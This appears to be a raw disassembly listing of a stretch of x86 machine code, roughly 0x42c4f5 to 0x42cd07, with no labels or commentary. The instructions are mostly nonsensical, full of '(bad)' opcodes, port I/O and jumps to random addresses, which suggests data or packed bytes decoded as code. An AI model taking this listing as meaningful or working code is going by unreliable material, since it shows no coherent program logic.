  42c4f5:	mov    BYTE PTR [eax],0xf7
  42c4f8:	test   BYTE PTR [eax],0xdc
  42c4fb:	int3   
  42c4fc:	std    
  42c4fd:	icebp  
  42c4fe:	fxch   st(0)
  42c500:	(bad)  
  42c501:	mov    dl,0xb5
  42c503:	mov    ch,0xa9
  42c505:	mul    esp
  42c507:	sti    
  42c508:	sti    
  42c509:	repz fmulp st(6),st
  42c50c:	cli    
  42c50d:	idiv   DWORD PTR [ebx-0x19fa080d]
  42c513:	push   ebp
  42c515:	out    0xd9,eax
  42c517:	(bad)  
  42c518:	in     eax,0xc9
  42c51a:	call   0xde11cb0d
  42c51f:	iret   
  42c520:	mov    al,0xc4
  42c522:	int3   
  42c523:	jmp    0xf1139f02
  42c528:	in     al,dx
  42c529:	iret   
  42c52a:	sar    dh,1
  42c52c:	mov    ch,0xd1
  42c52e:	mov    eax,0xf7c2dbfe
  42c533:	add    al,0xcb
  42c535:	(bad)  
  42c536:	fdecstp 
  42c538:	inc    DWORD PTR [ebx]
  42c53a:	mov    DWORD PTR [edi+eiz*8],0xb7edcaf9
  42c541:	ret    
  42c542:	div    al
  42c544:	cmc    
  42c545:	retf   0xe7d5
  42c548:	repnz xlat BYTE PTR ds:[ebx]
  42c54a:	repz out dx,al
  42c54c:	jmp    0xfdb8:0xfcbfb8ce
  42c553:	cmc    
  42c554:	out    0x7,al
  42c556:	call   0xe541bf42
  42c55b:	or     BYTE PTR [edi],al
  42c55d:	icebp  
  42c55e:	mov    ecx,0xb5d7f2c9
  42c563:	mov    dh,0xe1
  42c565:	(bad)  
  42c566:	mov    ebx,0xdfddcaef
  42c56b:	enter  0xfef5,0xbd
  42c56f:	enter  0x1c7,0xf4
  42c573:	add    bh,bl
  42c575:	rcr    edx,0xf
  42c578:	add    dl,bh
  42c57a:	loopne 0x42c57a
  42c57c:	loope  0x42c582
  42c57e:	repnz faddp st(2),st
  42c581:	mov    dh,0xe5
  42c583:	(bad)  
  42c584:	mov    bh,0xd4
  42c586:	fcom   st(3)
  42c588:	enter  0xb6d6,0x3
  42c58c:	icebp  
  42c58d:	int    0xfb
  42c58f:	div    bl
  42c591:	cld    
  42c592:	icebp  
  42c593:	out    0x6,eax
  42c595:	rcr    edi,0xc8
  42c598:	(bad)  
  42c599:	(bad)  
  42c59a:	in     al,0xe7
  42c59c:	fcmovnu st,st(5)
  42c59e:	retf   
  42c59f:	fnsave [ebx-0x251f2e24]
  42c5a5:	(bad)  
  42c5a6:	repz out 0xb9,al
  42c5a9:	shr    ebx,cl
  42c5ab:	rcr    ch,cl
  42c5ad:	hlt    
  42c5ae:	(bad)  
  42c5af:	sti    
  42c5b0:	repnz rcl ebp,1
  42c5b3:	mov    esi,0xea07dbde
  42c5b8:	or     dh,bl
  42c5ba:	or     esp,esi
  42c5bc:	jmp    0xea04a9c8
  42c5c1:	icebp  
  42c5c2:	mov    al,0xca
  42c5c4:	loope  0x42c5a8
  42c5c6:	repz mov ah,0xd3
  42c5c9:	stc    
  42c5ca:	mov    dh,0xd4
  42c5cc:	std    
  42c5cd:	int3   
  42c5ce:	(bad)  
  42c5d0:	add    edi,edx
  42c5d2:	in     eax,dx
  42c5d3:	neg    dh
  42c5d5:	std    
  42c5d6:	neg    ecx
  42c5d8:	(bad)  
  42c5db:	leave  
  42c5dc:	or     edi,edi
  42c5de:	in     al,dx
  42c5df:	into   
  42c5e0:	retf   0xb6cb
  42c5e3:	shr    dl,1
  42c5e5:	jmp    0x42c5be
  42c5e7:	aad    0xe6
  42c5e9:	into   
  42c5ea:	fbstp  TBYTE PTR [esi-0x271e4f10]
  42c5f0:	fsubr  st(1),st
  42c5f2:	cmc    
  42c5f3:	rol    bh,cl
  42c5f5:	aam    0xf4
  42c5f7:	out    0xf7,eax
  42c5f9:	(bad)  
  42c5fa:	jmp    0xdccc:0xbefc07ff
  42c601:	in     eax,0xf4
  42c603:	xlat   BYTE PTR ds:[ebx]
  42c604:	iret   
  42c605:	cmc    
  42c606:	(bad)  
  42c607:	loopne 0x42c5ce
  42c609:	lods   al,BYTE PTR ds:[esi]
  42c60a:	xlat   BYTE PTR ds:[ebx]
  42c60b:	xlat   BYTE PTR ds:[ebx]
  42c60c:	stc    
  42c60d:	mov    al,0xd5
  42c60f:	int    0xfb
  42c611:	fidivr DWORD PTR [edx+edi*4+0x8cbd5f7]
  42c618:	cld    
  42c619:	or     eax,0xf10affdb
  42c61e:	icebp  
  42c61f:	(bad)
  42c622:	rol    bl,cl
  42c624:	in     eax,0xf3
  42c626:	fsubr  st,st(0)
  42c628:	(bad)  
  42c629:	fdivrp st(1),st
  42c62b:	mov    dl,0xda
  42c62d:	shl    cl,1
  42c62f:	repnz loopne 0x42c603
  42c632:	cld    
  42c633:	lock push es
  42c635:	or     edi,ebp
  42c637:	sar    al,1
  42c639:	fstp   st(4)
  42c63b:	std    
  42c63c:	jecxz  0x42c651
  42c63e:	mov    esp,0xbcb7c4d1
  42c643:	aad    0xe7
  42c645:	sti    
  42c646:	repz cmc 
  42c648:	mov    edi,0xdbe9b3b8
  42c64d:	enter  0xd3ed,0x1
  42c651:	(bad)  
  42c653:	loop   0x42c64c
  42c655:	jmp    0x42c636
  42c657:	(bad)
  42c65a:	or     al,0xc5
  42c65c:	fist   WORD PTR [edx]
  42c65e:	rol    ebp,0xf3
  42c661:	(bad)  
  42c662:	fucom  st(3)
  42c664:	ret    0xf9b0
  42c667:	repz in al,0xf9
  42c66a:	mov    eax,0xe002eef4
  42c66f:	fstp   TBYTE PTR [eax-0x2a1a0219]
  42c675:	rcl    al,0xf8
  42c678:	leave  
  42c679:	(bad)  
  42c67b:	std    
  42c67c:	int    0xf
  42c67e:	retf   
  42c67f:	repz shl ebp,0xee
  42c683:	shl    eax,0xcb
  42c686:	mov    ecx,0xebe5adc5
  42c68b:	int3   
  42c68c:	int    0xf8
  42c68e:	fld    st(0)
  42c690:	aam    0xe7
  42c692:	mov    ebx,0xbf4fcc4
  42c698:	(bad)  
  42c69a:	jmp    0xeb0bb17f
  42c69f:	jmp    0xf5c6:0xc4ccddf6
  42c6a6:	mov    ebx,0xe8e9adef
  42c6ab:	retf   0xbcf2
  42c6ae:	fdiv   st,st(6)
  42c6b0:	idiv   dh
  42c6b2:	clc    
  42c6b3:	shr    edx,1
  42c6b5:	mov    eax,0xf6d8e208
  42c6ba:	iret   
  42c6bb:	pop    es
  42c6bc:	out    0xd9,eax
  42c6be:	jmp    0xcf249486
  42c6c3:	(bad)  
  42c6c4:	repz in eax,dx
  42c6c6:	out    dx,al
  42c6c7:	leave  
  42c6c8:	out    0xef,al
  42c6ca:	in     al,dx
  42c6cb:	cli    
  42c6cc:	fmul   st(2),st
  42c6ce:	xlat   BYTE PTR ds:[ebx]
  42c6cf:	fnstcw WORD PTR [ebx+edi*8-0x472a4324]
  42c6d6:	ret    0x206
  42c6d9:	sar    cl,0xfa
  42c6dc:	or     al,0xc4
  42c6de:	jmp    0xcab4:0xeaadc0ca
  42c6e5:	shr    dh,1
  42c6e7:	aad    0xea
  42c6e9:	retf   0xc9da
  42c6ec:	mov    ah,0xd3
  42c6ee:	fsqrt  
  42c6f0:	sar    DWORD PTR [edi+0xae7dad6],1
  42c6f6:	jmp    0xef229ed7
  42c6fb:	repz (bad) 
  42c6fe:	int3   
  42c6ff:	shr    dl,0xc1
  42c702:	stos   DWORD PTR es:[edi],eax
  42c703:	mov    esp,0xd1b3ebdb
  42c708:	out    dx,al
  42c709:	in     al,0xf3
  42c70b:	repnz xlat BYTE PTR ds:[ebx]
  42c70d:	(bad)  
  42c70f:	out    0xc7,eax
  42c711:	into   
  42c712:	hlt    
  42c713:	(bad)
  42c716:	std    
  42c717:	in     al,0xff
  42c719:	call   0xe820b224
  42c71e:	out    dx,al
  42c71f:	rol    bh,cl
  42c721:	fsub   st(0),st
  42c723:	call   0xd624adee
  42c728:	in     al,dx
  42c729:	(bad)  
  42c72b:	fcmove st,st(1)
  42c72d:	out    dx,eax
  42c72e:	loopne 0x42c6ed
  42c730:	mov    ecx,0xd8c3bbda
  42c735:	(bad)  
  42c736:	fdivr  st(5),st
  42c738:	loopne 0x42c735
  42c73a:	retf   0xecf
  42c73d:	les    ebp,FWORD PTR [ebp-0x4c1e3229]
  42c743:	in     eax,dx
  42c744:	lods   eax,DWORD PTR ds:[esi]
  42c745:	int    0xf2
  42c747:	mov    eax,0xdcf5c5f0
  42c74c:	retf   0xbed9
  42c74f:	(bad)  
  42c751:	out    dx,al
  42c752:	add    bh,BYTE PTR [ebp-0x1bff043f]
  42c758:	fucomi st,st(5)
  42c75a:	retf   
  42c75b:	into   
  42c75c:	(bad)  
  42c75e:	jmp    0xcd037056
  42c763:	mov    dl,0xb3
  42c765:	mov    ah,0xf2
  42c767:	jmp    0xdcb9:0xf0d8d7ba
  42c76e:	int3   
  42c76f:	mov    ebp,0xe0c1f2f8
  42c774:	fisttp WORD PTR [ecx]
  42c776:	aad    0xf9
  42c778:	aad    0xf6
  42c77a:	cmc    
  42c77b:	or     eax,0xe2cd0c0d
  42c780:	(bad)  
  42c781:	into   
  42c782:	loop   0x42c759
  42c784:	aam    0xca
  42c786:	out    dx,al
  42c787:	sar    BYTE PTR [ebx-0x35352b49],0x2
  42c78e:	idiv   ecx
  42c790:	in     eax,dx
  42c791:	icebp  
  42c792:	div    esp
  42c794:	or     edi,ebp
  42c796:	out    0xdc,eax
  42c798:	out    dx,eax
  42c799:	out    dx,eax
  42c79a:	add    cl,BYTE PTR [edi]
  42c79c:	add    al,0xe
  42c79e:	ret    0xebea
  42c7a1:	into   
  42c7a2:	lods   al,BYTE PTR ds:[esi]
  42c7a3:	int3   
  42c7a4:	loop   0x42c77f
  42c7a6:	les    esi,FWORD PTR [edx-0x4240c4c]
  42c7ac:	ror    bh,1
  42c7ae:	mov    edx,0x606fcb9
  42c7b3:	in     eax,0xd0
  42c7b5:	rcl    dh,1
  42c7b7:	in     al,0xc4
  42c7b9:	enter  0xe8e5,0xee
  42c7bd:	add    ah,cl
  42c7bf:	mov    ebp,0xcce0d5cf
  42c7c4:	out    dx,eax
  42c7c5:	mov    edx,0xdab5d8e0
  42c7ca:	cli    
  42c7cb:	fdivr  QWORD PTR [edi-0x1f2b1611]
  42c7d1:	in     eax,0xc5
  42c7d3:	shl    bl,1
  42c7d5:	neg    dh
  42c7d7:	ret    0xd4c6
  42c7da:	into   
  42c7db:	push   es
  42c7dc:	in     al,0x11
  42c7de:	jmp    0xe50d8bcd
  42c7e3:	lods   eax,DWORD PTR ds:[esi]
  42c7e4:	loop   0x42c7da
  42c7e6:	fcmovnbe st,st(0)
  42c7e8:	mov    edx,0xf1c9ffd0
  42c7ed:	loop   0x42c7e8
  42c7ef:	mov    ebp,0xc707d5e0
  42c7f4:	shl    ebp,cl
  42c7f6:	xlat   BYTE PTR ds:[ebx]
  42c7f7:	add    ch,al
  42c7f9:	or     ecx,edx
  42c7fb:	les    eax,FWORD PTR [ecx]
  42c7fd:	add    eax,0xdccbcce9
  42c802:	cmc    
  42c803:	jecxz  0x42c7f3
  42c805:	out    0xe4,al
  42c807:	mov    ah,0xef
  42c80a:	vpmaxsw ymm2,ymm6,ymm2
  42c80e:	int    0xdb
  42c810:	(bad)  
  42c811:	cmc    
  42c812:	sar    eax,0xfd
  42c815:	retf   
  42c816:	(bad)  
  42c818:	hlt    
  42c819:	out    0xe5,al
  42c81b:	(bad)  
  42c81c:	in     al,dx
  42c81d:	in     eax,dx
  42c81e:	fsubr  QWORD PTR [edx+esi*4-0x2f2e5450]
  42c825:	in     eax,0xd7
  42c827:	idiv   al
  42c829:	int3   
  42c82a:	fpatan 
  42c82c:	clc    
  42c82d:	out    dx,eax
  42c82e:	cmc    
  42c82f:	int3   
  42c830:	(bad)  
  42c831:	stc    
  42c832:	call   edi
  42c834:	mov    esp,0x5c7f501
  42c83a:	out    dx,eax
  42c83b:	hlt    
  42c83c:	int    0xff
  42c83e:	(bad)  
  42c83f:	mov    edi,0xd5e2d2c9
  42c844:	lods   eax,DWORD PTR ds:[esi]
  42c845:	into   
  42c846:	call   0xc61b9c1a
  42c84b:	int3   
  42c84c:	cld    
  42c84d:	int    0xf6
  42c84f:	add    edx,edx
  42c851:	sar    edi,1
  42c853:	fcmovb st,st(4)
  42c855:	jecxz  0x42c81d
  42c857:	loop   0x42c85b
  42c859:	in     al,0xde
  42c85b:	in     eax,dx
  42c85c:	fisttp QWORD PTR [eax]
  42c85e:	out    0xbf,eax
  42c860:	mov    ebp,0xb3c9e7ef
  42c865:	(bad)  
  42c866:	idiv   BYTE PTR [ecx-0x41323717]
  42c86c:	call   0xd74aba67
  42c871:	hlt    
  42c872:	fxch   st(4)
  42c874:	shl    esi,cl
  42c876:	lock stc 
  42c878:	or     DWORD PTR [edx],ecx
  42c87a:	call   0xca1b9765
  42c87f:	shr    ebp,0xe6
  42c882:	mov    ch,0xeb
  42c884:	shl    bh,cl
  42c886:	mov    ecx,0xddf5c9f5
  42c88b:	iret   
  42c88c:	retf   0xd8f2
  42c88f:	fmul   st,st(7)
  42c891:	aam    0xd5
  42c893:	int3   
  42c894:	rol    ebx,1
  42c896:	test   BYTE PTR ds:0xc9fa04c5,0xc5
  42c89d:	leave  
  42c89e:	iret   
  42c89f:	icebp  
  42c8a0:	rol    bh,1
  42c8a2:	retf   0xdac2
  42c8a5:	jmp    0x42c89b
  42c8a7:	xlat   BYTE PTR ds:[ebx]
  42c8a8:	mov    cl,0xba
  42c8aa:	(bad)  
  42c8ac:	fistp  QWORD PTR [esi-0x190d2f0a]
  42c8b2:	neg    cl
  42c8b4:	loop   0x42c87d
  42c8b6:	out    0xe8,eax
  42c8b8:	add    bh,bl
  42c8ba:	loop   0x42c8b4
  42c8bc:	into   
  42c8bd:	cld    
  42c8be:	lock retf 0xeeae
  42c8c2:	mov    dl,0xcd
  42c8c4:	jmp    0xcece:0xe5aebae5
  42c8cb:	int    0xd1
  42c8cd:	iret   
  42c8ce:	int3   
  42c8cf:	fyl2x  
  42c8d1:	loop   0x42c8d4
  42c8d3:	loop   0x42c8a0
  42c8d5:	cld    
  42c8d6:	add    al,0xf6
  42c8d8:	imul   bl
  42c8da:	add    DWORD PTR [esi],eax
  42c8dc:	loopne 0x42c8d7
  42c8de:	mov    cl,0xe9
  42c8e0:	shr    esi,0xb3
  42c8e3:	lods   eax,DWORD PTR ds:[esi]
  42c8e4:	shl    ebp,1
  42c8e6:	aam    0xe8
  42c8e8:	jmp    0x427a7ab
  42c8ed:	mov    esp,0x3dfedd3
  42c8f2:	(bad)  
  42c8f3:	loop   0x42c8ca
  42c8f5:	add    edx,esi
  42c8f7:	call   0xc94aa1d8
  42c8fc:	fstp   st(6)
  42c8fe:	into   
  42c8ff:	shr    DWORD PTR [edi-0x31493b49],cl
  42c905:	in     eax,0xef
  42c907:	test   dl,0xbb
  42c90a:	out    dx,eax
  42c90b:	mov    esi,0xdad5dcf8
  42c910:	hlt    
  42c911:	fucom  st(1)
  42c913:	fcmovne st,st(3)
  42c915:	fmul   QWORD PTR [ecx]
  42c917:	or     ch,al
  42c919:	in     eax,dx
  42c91a:	leave  
  42c91b:	stc    
  42c91c:	std    
  42c91d:	add    dh,ch
  42c91f:	(bad)  
  42c920:	int3   
  42c921:	les    esi,FWORD PTR [eax-0x4d48480c]
  42c927:	shr    dh,cl
  42c929:	call   0xf820991d
  42c92e:	mov    ebp,0xe3d0bddc
  42c933:	(bad)  
  42c934:	loopne 0x42c930
  42c936:	rol    dh,1
  42c938:	shr    ch,0xe6
  42c93b:	add    eax,0xe0b30e04
  42c940:	(bad)
  42c944:	out    0xc4,eax
  42c946:	mov    al,0xb7
  42c948:	rcl    esp,cl
  42c94a:	lock into 
  42c94c:	jecxz  0x42c94f
  42c94e:	fmul   st(7),st
  42c950:	fdivr  st(7),st
  42c952:	repnz mov esp,0x6cbfdda
  42c958:	or     BYTE PTR [edx],al
  42c95a:	stc    
  42c95b:	add    eax,0xc0ece6eb
  42c960:	(bad)  
  42c961:	mov    esp,0xf1bbe5c1
  42c966:	aam    0xce
  42c968:	into   
  42c969:	out    dx,al
  42c96a:	in     al,dx
  42c96b:	int    0xfc
  42c96d:	(bad)  
  42c96f:	stc    
  42c970:	xlat   BYTE PTR ds:[ebx]
  42c971:	cli    
  42c972:	mov    esi,0xd1c405d0
  42c977:	or     ah,ah
  42c979:	jmp    0xff529867
  42c97e:	mov    esi,0xc5c4ccc1
  42c983:	repnz iret 
  42c985:	frstpm(287 only) 
  42c987:	mov    ch,0xb1
  42c989:	cli    
  42c98a:	hlt    
  42c98b:	icebp  
  42c98c:	out    dx,al
  42c98d:	out    dx,al
  42c98e:	loope  0x42c985
  42c990:	mov    ecx,0xd5c7f4ff
  42c996:	rol    bh,1
  42c998:	fsubrp st(6),st
  42c99a:	lds    ecx,FWORD PTR [edx]
  42c99c:	adc    eax,DWORD PTR [ebx+ebp*8]
  42c99f:	call   0xd407976a
  42c9a4:	leave  
  42c9a5:	lods   al,BYTE PTR ds:[esi]
  42c9a6:	aam    0xed
  42c9a8:	mov    ebx,0xd3cddfc6
  42c9ad:	cmc    
  42c9ae:	fdivr  st(2),st
  42c9b0:	loope  0x42c995
  42c9b2:	add    bl,cl
  42c9b4:	(bad)  
  42c9b6:	(bad)  
  42c9b8:	(bad)  
  42c9ba:	jmp    0x42c99c
  42c9bc:	out    dx,al
  42c9bd:	(bad)  
  42c9bf:	mov    ebp,0xe3bcc9cf
  42c9c4:	repz retf 0xccd6
  42c9c8:	(bad)  
  42c9c9:	jmp    0xdab7:0xdabfbbd0
  42c9d0:	pop    es
  42c9d1:	fscale 
  42c9d3:	mov    esp,0x2bfd7f6
  42c9d8:	retf   0xc6bc
  42c9db:	add    BYTE PTR [ebx],cl
  42c9dd:	jmp    0xaed3:0xf7e6e7be
  42c9e4:	mov    ah,0xd9
  42c9e6:	shl    BYTE PTR [eax+esi*8-0x34263454],1
  42c9ed:	rol    DWORD PTR [ebx],1
  42c9ef:	(bad)  
  42c9f0:	mov    edi,0xe4d2d4c3
  42c9f5:	ror    bl,cl
  42c9f7:	xlat   BYTE PTR ds:[ebx]
  42c9f8:	call   0xd02794fe
  42c9fd:	(bad)  
  42c9fe:	stos   DWORD PTR es:[edi],eax
  42c9ff:	imul   DWORD PTR [ebp-0x163d3332]
  42ca05:	mov    cl,0xe0
  42ca07:	mov    cl,0xbf
  42ca09:	mov    ecx,0xcc02def2
  42ca0e:	leave  
  42ca0f:	(bad)  
  42ca10:	in     eax,dx
  42ca11:	mov    ah,0x3
  42ca13:	out    0xc5,eax
  42ca15:	add    al,BYTE PTR [edx]
  42ca17:	cld    
  42ca18:	cmc    
  42ca19:	or     eax,0xccddbde
  42ca1e:	in     eax,0xc4
  42ca20:	out    0xac,al
  42ca22:	retf   0xd5d5
  42ca25:	mov    cl,0xcd
  42ca27:	aam    0xe9
  42ca29:	mov    edx,0xf0b1d1c4
  42ca2e:	mov    edx,0xd2dbe6e2
  42ca33:	ret    0xead9
  42ca36:	call   0xea36cb0b
  42ca3b:	out    0xfb,eax
  42ca3d:	adc    edi,DWORD PTR [ecx+ebp*4-0x2d0b360d]
  42ca44:	out    0xba,eax
  42ca46:	repnz (bad) 
  42ca48:	clc    
  42ca49:	cli    
  42ca4a:	mov    edx,0xe1f0c8d6
  42ca4f:	fcmovb st,st(3)
  42ca51:	loopne 0x42ca4f
  42ca53:	not    edx
  42ca55:	aam    0xfd
  42ca57:	mov    esi,0x8e0dfe3
  42ca5c:	loope  0x42ca56
  42ca5e:	ret    0xd0a9
  42ca61:	leave  
  42ca62:	scas   al,BYTE PTR es:[edi]
  42ca63:	lods   eax,DWORD PTR ds:[esi]
  42ca64:	jmp    0x42ca56
  42ca66:	mov    ecx,0xd2efb6d9
  42ca6b:	rcl    bl,cl
  42ca6d:	ret    
  42ca6e:	(bad)  
  42ca70:	fidivr WORD PTR [edi-0x6fb191e]
  42ca76:	add    al,0xc2
  42ca78:	(bad)  
  42ca79:	jmp    0x42ca66
  42ca7b:	or     edx,ecx
  42ca7d:	push   cs
  42ca7e:	ret    0xf2dd
  42ca81:	mov    esp,0xebe6b7c9
  42ca86:	mov    edx,0xd1bab4cf
  42ca8b:	idiv   dl
  42ca8d:	std    
  42ca8e:	fild   WORD PTR [eax]
  42ca90:	xlat   BYTE PTR ds:[ebx]
  42ca91:	rcl    bl,1
  42ca93:	add    edi,ebx
  42ca95:	retf   
  42ca96:	(bad)  
  42ca97:	loope  0x42ca70
  42ca99:	lds    ecx,FWORD PTR [esi]
  42ca9b:	int3   
  42ca9c:	out    0xcb,eax
  42ca9e:	shl    dh,1
  42caa0:	out    0xcf,al
  42caa2:	repnz into 
  42caa4:	ret    0xe5e0
  42caa7:	out    dx,eax
  42caa8:	sti    
  42caa9:	lods   al,BYTE PTR ds:[esi]
  42caaa:	retf   0xb8de
  42caad:	mov    edx,0xd6d2b6f8
  42cab2:	aam    0xf2
  42cab4:	push   es
  42cab5:	(bad)  
  42cab7:	aad    0xe3
  42cab9:	sti    
  42caba:	cli    
  42cabb:	ret    0x1df
  42cabe:	call   0xc918bdb2
  42cac3:	lock out 0xf9,eax
  42cac6:	cmc    
  42cac7:	into   
  42cac8:	int3   
  42cac9:	fcmovnbe st,st(2)
  42cacb:	mov    edi,0xb9beeff9
  42cad0:	fldlg2 
  42cad2:	icebp  
  42cad3:	jmp    0x42cacc
  42cad5:	hlt    
  42cad6:	sti    
  42cad7:	stc    
  42cad8:	idiv   bl
  42cada:	add    al,0xca
  42cadc:	or     al,0xcf
  42cade:	scas   al,BYTE PTR es:[edi]
  42cadf:	shr    BYTE PTR [edi-0x1c114e2d],0xcc
  42cae6:	in     eax,0xdb
  42cae8:	(bad)  
  42caea:	mov    edi,0xe3f1eaf6
  42caef:	fsub   st,st(3)
  42caf1:	mov    edi,0xc3e601df
  42caf6:	jmp    0x42cac3
  42caf8:	push   es
  42caf9:	out    dx,al
  42cafa:	out    0xec,eax
  42cafc:	retf   
  42cafd:	int3   
  42cafe:	icebp  
  42caff:	into   
  42cb00:	fdiv   QWORD PTR [eax-0x1b1f1455]
  42cb06:	call   0xea08a6d9
  42cb0b:	fcmovu st,st(0)
  42cb0d:	out    dx,eax
  42cb0e:	inc    BYTE PTR [ecx]
  42cb10:	add    esp,ecx
  42cb12:	fcom   st(7)
  42cb14:	(bad)  
  42cb16:	(bad)  
  42cb18:	add    eax,0xfe090dfe
  42cb1d:	retf   0xcfbf
  42cb20:	mov    esi,0xe4f0c1c9
  42cb25:	out    dx,eax
  42cb26:	iret   
  42cb27:	mov    edx,0xd4edcedb
  42cb2c:	int    0xc2
  42cb2e:	mov    esp,0xf0f807fb
  42cb33:	repz xlat BYTE PTR ds:[ebx]
  42cb35:	jmp    0xd031cc20
  42cb3a:	or     al,0xb
  42cb3c:	fst    st(3)
  42cb3e:	sar    DWORD PTR [esi-0x371c1e18],0xe9
  42cb45:	mov    ch,0xfb
  42cb47:	rcr    cl,0xcd
  42cb4a:	(bad)  
  42cb4b:	stc    
  42cb4c:	(bad)  
  42cb4d:	mov    al,0xb9
  42cb4f:	fstp   st(0)
  42cb51:	add    eax,edi
  42cb53:	rol    ch,0xcb
  42cb56:	ror    DWORD PTR [eax],1
  42cb58:	or     bh,BYTE PTR [ebx+ecx*8-0x1b17f4f9]
  42cb5f:	shl    edi,1
  42cb61:	mov    al,0xaf
  42cb63:	in     al,dx
  42cb64:	out    dx,al
  42cb65:	in     eax,dx
  42cb66:	repz into 
  42cb68:	int    0xb8
  42cb6a:	shl    ah,cl
  42cb6c:	retf   0xbff6
  42cb6f:	imul   esi
  42cb71:	mov    ah,0xc1
  42cb73:	(bad)  
  42cb74:	(bad)  
  42cb75:	idiv   dl
  42cb77:	fucomip st,st(0)
  42cb79:	into   
  42cb7a:	fisttp DWORD PTR ds:0xbeecd308
  42cb80:	(bad)  
  42cb81:	jmp    0x42cb51
  42cb83:	rol    dh,1
  42cb85:	int3   
  42cb86:	iret   
  42cb87:	mov    al,0xc8
  42cb89:	into   
  42cb8a:	out    dx,eax
  42cb8b:	out    dx,eax
  42cb8c:	mov    ebp,0xfefdffcf
  42cb91:	mov    ah,0xc7
  42cb93:	rol    ebp,0xd2
  42cb96:	(bad)  
  42cb98:	or     DWORD PTR [ebx],ecx
  42cb9a:	push   cs
  42cb9b:	aam    0xed
  42cb9d:	rol    ebx,cl
  42cb9f:	out    dx,eax
  42cba0:	mov    ebp,0xcac6cfb2
  42cba5:	shl    DWORD PTR [ecx-0x4a480105],cl
  42cbab:	fsubr  st,st(5)
  42cbad:	loop   0x42cba4
  42cbaf:	hlt    
  42cbb0:	inc    BYTE PTR ds:0xe3e6c5c7
  42cbb6:	add    DWORD PTR [edi],eax
  42cbb8:	or     ebx,esp
  42cbba:	psllq  mm0,QWORD PTR [ecx]
  42cbbd:	sar    BYTE PTR [eax-0x124e1641],cl
  42cbc3:	stos   BYTE PTR es:[edi],al
  42cbc4:	cmc    
  42cbc5:	mov    ebx,0xe4b6c0c0
  42cbca:	mov    ebp,0xd6d0e9fb
  42cbcf:	add    al,bh
  42cbd1:	jmp    edi
  42cbd3:	loop   0x42cbe0
  42cbd5:	cld    
  42cbd6:	(bad)  
  42cbd7:	lock paddq mm7,mm7
  42cbdb:	add    DWORD PTR ds:0xd3acd8e1,ecx
  42cbe1:	retf   
  42cbe2:	hlt    
  42cbe3:	repnz fidiv DWORD PTR [ebx-0x364b4b1b]
  42cbea:	retf   
  42cbeb:	mov    edx,0x2f6fcde
  42cbf0:	in     al,dx
  42cbf1:	aad    0xe7
  42cbf3:	hlt    
  42cbf4:	add    eax,esp
  42cbf6:	ret    
  42cbf7:	out    dx,eax
  42cbf8:	loope  0x42cbe3
  42cbfa:	in     eax,0xe8
  42cbfc:	retf   0xee07
  42cbff:	lods   al,BYTE PTR ds:[esi]
  42cc00:	xlat   BYTE PTR ds:[ebx]
  42cc01:	shr    esp,cl
  42cc03:	(bad)  
  42cc04:	in     al,dx
  42cc05:	lock mov al,0xb5
  42cc08:	fmulp  st(1),st
  42cc0a:	int3   
  42cc0b:	cli    
  42cc0c:	mov    ebp,0xfcdddde9
  42cc11:	shl    dh,1
  42cc13:	aam    0xfc
  42cc15:	repnz out 0xd9,al
  42cc18:	or     DWORD PTR ds:0xce0f01ea,ecx
  42cc1e:	scas   eax,DWORD PTR es:[edi]
  42cc1f:	retf   0xf2d6
  42cc22:	lods   al,BYTE PTR ds:[esi]
  42cc23:	retf   0xe8b1
  42cc26:	out    0xc6,al
  42cc28:	fsubrp st(4),st
  42cc2a:	jmp    0x7f3:0xbaf9b5
  42cc31:	out    0xc1,eax
  42cc33:	idiv   esi
  42cc35:	fucom  st(7)
  42cc37:	shl    ebp,0x3
  42cc3a:	add    ah,bl
  42cc3c:	loope  0x42cc1c
  42cc3e:	out    dx,eax
  42cc3f:	in     eax,dx
  42cc40:	jmp    0xc4e1:0xc9c7afe3
  42cc47:	aam    0xe9
  42cc49:	(bad)  
  42cc4a:	fstp   st(2)
  42cc4c:	add    bh,BYTE PTR [ebx-0x26330c27]
  42cc52:	icebp  
  42cc53:	jmp    0x42cc30
  42cc55:	retf   
  42cc56:	call   0x102ba15b
  42cc5b:	(bad)  
  42cc5d:	or     eax,0xb7dfaed9
  42cc62:	int3   
  42cc63:	leave  
  42cc64:	lock mov dl,0xcd
  42cc67:	shr    DWORD PTR [ebp-0x4330151a],cl
  42cc6d:	rcl    edx,1
  42cc6f:	cli    
  42cc70:	fild   WORD PTR [ecx]
  42cc72:	add    DWORD PTR [ebp+0x5eadcf1],edi
  42cc78:	pop    es
  42cc79:	push   cs
  42cc7a:	in     al,0xe
  42cc7c:	add    al,0x6
  42cc7e:	retf   
  42cc7f:	stos   BYTE PTR es:[edi],al
  42cc80:	jmp    0x42cc47
  42cc82:	loope  0x42cc31
  42cc84:	mov    ah,0xc8
  42cc86:	(bad)  
  42cc87:	(bad)  
  42cc88:	jmp    0x42cc76
  42cc8a:	aad    0xdd
  42cc8c:	cmc    
  42cc8d:	rol    bl,1
  42cc8f:	mov    edx,0xe6f2da01
  42cc94:	clc    
  42cc95:	fucom  st(1)
  42cc97:	std    
  42cc98:	or     BYTE PTR [esi],al
  42cc9a:	or     al,0x5
  42cc9c:	jmp    0xf5e6:0xc8cfaee0
  42cca3:	out    dx,al
  42cca4:	les    esi,FWORD PTR [edx-0xb3a4447]
  42ccaa:	ror    ecx,1
  42ccac:	mov    ebp,0xd1c3feee
  42ccb1:	in     al,dx
  42ccb2:	(bad)  
  42ccb3:	icebp  
  42ccb4:	in     eax,0x3
  42ccb6:	cmc    
  42ccb7:	add    esp,ebx
  42ccb9:	(bad)  
  42ccbb:	enter  0xc8c9,0xa7
  42ccbf:	leave  
  42ccc0:	lock mov dh,0xad
  42ccc3:	mov    ah,0xe3
  42ccc5:	mov    bh,0xe9
  42ccc7:	loopne 0x42cc79
  42ccc9:	lock call 0xf600cfbe
  42cccf:	mov    ebp,0xfbbbcdc3
  42ccd4:	repnz or eax,esp
  42ccd7:	aam    0xf5
  42ccd9:	out    0xc6,al
  42ccdb:	loopne 0x42ccdd
  42ccdd:	(bad)  
  42ccde:	jmp    0xeef393ad
  42cce3:	call   0xdbf9c2ac
  42cce8:	aam    0xdd
  42ccea:	mov    ebp,0xe8bf02be
  42ccef:	mov    dh,0xdf
  42ccf1:	add    eax,ebx
  42ccf3:	fdivr  QWORD PTR [ebp-0x1d053e1a]
  42ccf9:	in     eax,dx
  42ccfa:	loop   0x42ccf6
  42ccfc:	add    cl,al
  42ccfe:	fmul   st(3),st
  42cd00:	rcl    dh,0xc5
  42cd03:	mov    cl,0xb7
  42cd05:	(bad)  
  42cd07:	dec    edx
